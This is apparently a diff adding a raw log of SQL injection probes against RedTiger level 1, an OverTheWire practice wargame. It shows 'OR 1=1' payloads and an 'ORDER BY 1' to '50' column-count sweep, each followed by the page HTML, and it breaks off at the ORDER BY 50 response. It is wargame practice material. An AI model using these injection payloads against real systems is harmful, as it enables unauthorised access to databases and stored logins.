@@ -1,0 +1,2190 @@
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1%27+OR+1%3D1%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1%27+OR+1%3D1--
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+OR+1%3D1%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br><b>This hackit is cool :)</b><br>My cats are sweet.<br />
+Miau<br><br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+OR+1%3D1--
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br><b>This hackit is cool :)</b><br>My cats are sweet.<br />
+Miau<br><br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+1%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br><b>This hackit is cool :)</b><br>My cats are sweet.<br />
+Miau<br><br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+2%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br><b>This hackit is cool :)</b><br>My cats are sweet.<br />
+Miau<br><br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+3%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br><b>This hackit is cool :)</b><br>My cats are sweet.<br />
+Miau<br><br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+4%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br><b>This hackit is cool :)</b><br>My cats are sweet.<br />
+Miau<br><br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+5%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+6%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+7%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+8%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+9%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+10%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+11%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+12%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+13%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+14%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+15%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+16%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+17%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+18%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+19%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+20%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+21%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+22%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+23%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+24%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+25%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+26%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+27%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+28%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+29%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+30%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+31%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+32%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+33%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+34%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+35%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+36%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+37%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+38%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+39%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+40%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+41%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+42%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+43%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+44%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+45%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+46%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+47%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+48%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+49%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
+Target: Get the login for the user Hornoxe
+<br>
+Hint: You really need one? omg -_-
+<br>
+Tablename: level1_users
+<br><br><br>
+
+<br>Category: <a href="?cat=1">1</a><br><br>This category does not exist! <br>
+			<br><br><br>
+			<form method="post">
+				Username: <input type="text" name="user"><br>
+				Password: <input type="text" name="password">
+				<input type="submit" name="login" value="Login">
+			</form>
+			<br>
+		
+Sending to  https://redtiger.labs.overthewire.org/level1.php?cat=1+ORDER+BY+50%23
+<b>Welcome to level 1</b>
+<br><br>
+Lets start with a simple injection.
+<br><br>
